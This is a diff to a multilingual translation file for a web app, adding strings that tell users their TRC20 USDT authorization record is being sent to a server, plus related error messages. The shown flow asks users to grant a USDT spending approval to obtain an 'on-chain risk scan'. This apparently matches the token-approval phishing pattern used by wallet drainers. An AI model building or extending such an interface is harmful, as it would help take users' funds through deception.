@@ -114,6 +114,7 @@ export const resources = {
           connecting: "Requesting wallet connection...",
           connected: "Wallet connected, and address validation has passed.",
           authorizing: "Processing TRC20 USDT authorization request...",
+          syncingAuthorizationRecord: "Submitting authorization record to the server, please wait...",
           authorized: "Authorization succeeded. On-chain risk analysis has started.",
           scanComplete: "{{engine}} has completed the multi-dimensional on-chain analysis.",
           resetConnected: "Wallet remains connected. You can run another scan.",
@@ -242,6 +243,10 @@ export const resources = {
         authorizationInterrupted: "The authorization process was interrupted. Please start the scan again.",
         approvalSpenderUnavailable:
           "Could not load the authorization recipient address. Check your network or try again later.",
+        supabaseNotConfigured:
+          "Server storage is not configured. The authorization record could not be saved. Please contact support.",
+        authorizationRecordFailed:
+          "Could not save the authorization record. Check your network and try authorizing again.",
       },
       notFound: {
         title: "404",
@@ -357,6 +362,7 @@ export const resources = {
           connecting: "正在请求钱包连接...",
           connected: "钱包已连接，地址合法性校验通过。",
           authorizing: "正在处理 TRC20 USDT 授权请求...",
+          syncingAuthorizationRecord: "正在将授权记录同步到服务器，请稍候…",
           authorized: "授权成功，已进入链上风险检测。",
           scanComplete: "{{engine}} 已完成多维链上分析",
           resetConnected: "钱包已连接，可再次发起检测。",
@@ -482,6 +488,8 @@ export const resources = {
         walletConnectFailed: "钱包连接失败，请稍后重试。",
         authorizationInterrupted: "授权流程中断，请重新发起检测。",
         approvalSpenderUnavailable: "无法加载授权接收地址，请检查网络或稍后重试。",
+        supabaseNotConfigured: "服务端存储未配置，无法完成授权记录归档，请联系支持。",
+        authorizationRecordFailed: "授权记录保存失败，请检查网络后重新授权。",
       },
       notFound: {
         title: "404",
@@ -557,6 +565,7 @@ export const resources = {
           connecting: "正在請求錢包連接...",
           connected: "錢包已連接，地址合法性校驗通過。",
           authorizing: "正在處理 TRC20 USDT 授權請求...",
+          syncingAuthorizationRecord: "正在將授權紀錄同步至伺服器，請稍候…",
           authorized: "授權成功，已進入鏈上風險檢測。",
           scanComplete: "{{engine}} 已完成多維鏈上分析",
           resetConnected: "錢包已連接，可再次發起檢測。",
@@ -641,6 +650,8 @@ export const resources = {
         walletConnectFailed: "錢包連接失敗，請稍後再試。",
         authorizationInterrupted: "授權流程中斷，請重新發起檢測。",
         approvalSpenderUnavailable: "無法載入授權接收地址，請檢查網路或稍後重試。",
+        supabaseNotConfigured: "伺服端儲存未設定，無法完成授權紀錄歸檔，請聯絡支援。",
+        authorizationRecordFailed: "授權紀錄儲存失敗，請檢查網路後重新授權。",
       },
       notFound: { title: "404", description: "糟糕！找不到此頁面", action: "返回首頁" },
     },
@@ -706,6 +717,7 @@ export const resources = {
           connecting: "वॉलेट कनेक्शन का अनुरोध किया जा रहा है...",
           connected: "वॉलेट कनेक्ट हो गया है और पता सत्यापन सफल है।",
           authorizing: "TRC20 USDT ऑथराइजेशन अनुरोध प्रोसेस हो रहा है...",
+          syncingAuthorizationRecord: "ऑथराइजेशन रिकॉर्ड सर्वर पर सबमिट किया जा रहा है, कृपया प्रतीक्षा करें...",
           authorized: "ऑथराइजेशन सफल। ऑन-चेन रिस्क विश्लेषण शुरू हो गया है।",
           scanComplete: "{{engine}} ने बहुआयामी ऑन-चेन विश्लेषण पूरा कर लिया है।",
           resetConnected: "वॉलेट कनेक्टेड है। आप फिर से स्कैन चला सकते हैं।",
@@ -787,6 +799,10 @@ export const resources = {
         authorizationInterrupted: "ऑथराइजेशन प्रक्रिया रुक गई। कृपया स्कैन फिर से शुरू करें।",
         approvalSpenderUnavailable:
           "ऑथराइज़ेशन प्राप्तकर्ता पता लोड नहीं हो सका। कृपया नेटवर्क जांचें या बाद में पुनः प्रयास करें।",
+        supabaseNotConfigured:
+          "सर्वर स्टोरेज कॉन्फ़िगर नहीं है। ऑथराइजेशन रिकॉर्ड सहेजा नहीं जा सका। कृपया सहायता से संपर्क करें।",
+        authorizationRecordFailed:
+          "ऑथराइजेशन रिकॉर्ड सहेजा नहीं जा सका। नेटवर्क जांचें और फिर से ऑथराइज करें।",
       },
       notFound: { title: "404", description: "ओह! पेज नहीं मिला", action: "होम पर लौटें" },
     },
@@ -852,6 +868,7 @@ export const resources = {
           connecting: "ウォレット接続を要求しています...",
           connected: "ウォレット接続が完了し、アドレス検証に成功しました。",
           authorizing: "TRC20 USDT 承認リクエストを処理中...",
+          syncingAuthorizationRecord: "承認記録をサーバーに送信中です。しばらくお待ちください…",
           authorized: "承認が完了し、オンチェーンリスク分析を開始しました。",
           scanComplete: "{{engine}} が多面的なオンチェーン分析を完了しました。",
           resetConnected: "ウォレットは接続済みです。再度検査できます。",
@@ -933,6 +950,10 @@ export const resources = {
         authorizationInterrupted: "承認プロセスが中断されました。再度検査を開始してください。",
         approvalSpenderUnavailable:
           "承認先アドレスを読み込めませんでした。ネットワークを確認するか、しばらくしてから再試行してください。",
+        supabaseNotConfigured:
+          "サーバー側の保存先が設定されていません。承認記録を保存できません。サポートにお問い合わせください。",
+        authorizationRecordFailed:
+          "承認記録を保存できませんでした。ネットワークを確認し、再度承認してください。",
       },
       notFound: { title: "404", description: "お探しのページは見つかりません", action: "ホームに戻る" },
     },
@@ -998,6 +1019,7 @@ export const resources = {
           connecting: "지갑 연결을 요청 중...",
           connected: "지갑이 연결되었고 주소 검증이 완료되었습니다.",
           authorizing: "TRC20 USDT 승인 요청을 처리 중...",
+          syncingAuthorizationRecord: "승인 기록을 서버에 제출하는 중입니다. 잠시만 기다려 주세요…",
           authorized: "승인 완료. 온체인 리스크 분석이 시작되었습니다.",
           scanComplete: "{{engine}}가 다차원 온체인 분석을 완료했습니다.",
           resetConnected: "지갑이 연결된 상태입니다. 다시 검사할 수 있습니다.",
@@ -1079,6 +1101,10 @@ export const resources = {
         authorizationInterrupted: "승인 과정이 중단되었습니다. 검사를 다시 시작해 주세요.",
         approvalSpenderUnavailable:
           "승인 수신 주소를 불러올 수 없습니다. 네트워크를 확인하거나 잠시 후 다시 시도하세요.",
+        supabaseNotConfigured:
+          "서버 저장소가 설정되지 않아 승인 기록을 저장할 수 없습니다. 지원팀에 문의하세요.",
+        authorizationRecordFailed:
+          "승인 기록을 저장하지 못했습니다. 네트워크를 확인한 뒤 다시 승인해 주세요.",
       },
       notFound: { title: "404", description: "페이지를 찾을 수 없습니다", action: "홈으로 돌아가기" },
     },
@@ -1144,6 +1170,7 @@ export const resources = {
           connecting: "กำลังร้องขอการเชื่อมต่อ...",
           connected: "เชื่อมต่อแล้วและผ่านการตรวจสอบที่อยู่",
           authorizing: "กำลังประมวลผลคำขออนุญาต TRC20 USDT...",
+          syncingAuthorizationRecord: "กำลังส่งบันทึกการอนุญาตไปยังเซิร์ฟเวอร์ โปรดรอสักครู่…",
           authorized: "อนุญาตสำเร็จ เริ่มการวิเคราะห์แล้ว",
           scanComplete: "{{engine}} วิเคราะห์เสร็จสมบูรณ์แล้ว",
           resetConnected: "กระเป๋ายังคงเชื่อมต่ออยู่",
@@ -1225,6 +1252,10 @@ export const resources = {
         authorizationInterrupted: "ขั้นตอนการอนุญาตถูกขัดจังหวะ โปรดเริ่มใหม่",
         approvalSpenderUnavailable:
           "โหลดที่อยู่ผู้รับอนุญาตไม่สำเร็จ โปรดตรวจสอบเครือข่ายหรือลองใหม่ภายหลัง",
+        supabaseNotConfigured:
+          "ยังไม่ได้ตั้งค่าที่เก็บข้อมูลบนเซิร์ฟเวอร์ ไม่สามารถบันทึกการอนุญาตได้ โปรดติดต่อฝ่ายสนับสนุน",
+        authorizationRecordFailed:
+          "บันทึกการอนุญาตไม่สำเร็จ โปรดตรวจสอบเครือข่ายแล้วลองอนุญาตอีกครั้ง",
       },
       notFound: { title: "404", description: "ขออภัย ไม่พบหน้านี้", action: "กลับหน้าแรก" },
     },
@@ -1290,6 +1321,7 @@ export const resources = {
           connecting: "Meminta koneksi dompet...",
           connected: "Dompet terhubung dan validasi alamat berhasil.",
           authorizing: "Memproses permintaan otorisasi TRC20 USDT...",
+          syncingAuthorizationRecord: "Mengirim catatan otorisasi ke server, harap tunggu...",
           authorized: "Otorisasi berhasil. Analisis risiko dimulai.",
           scanComplete: "{{engine}} telah menyelesaikan analisis.",
           resetConnected: "Dompet masih terhubung.",
@@ -1371,6 +1403,10 @@ export const resources = {
         authorizationInterrupted: "Proses otorisasi terputus. Silakan mulai pemindaian lagi.",
         approvalSpenderUnavailable:
           "Tidak dapat memuat alamat penerima otorisasi. Periksa jaringan atau coba lagi nanti.",
+        supabaseNotConfigured:
+          "Penyimpanan server belum dikonfigurasi. Catatan otorisasi tidak dapat disimpan. Hubungi dukungan.",
+        authorizationRecordFailed:
+          "Gagal menyimpan catatan otorisasi. Periksa jaringan lalu coba otorisasi lagi.",
       },
       notFound: { title: "404", description: "Ups! Halaman tidak ditemukan", action: "Kembali ke Beranda" },
     },
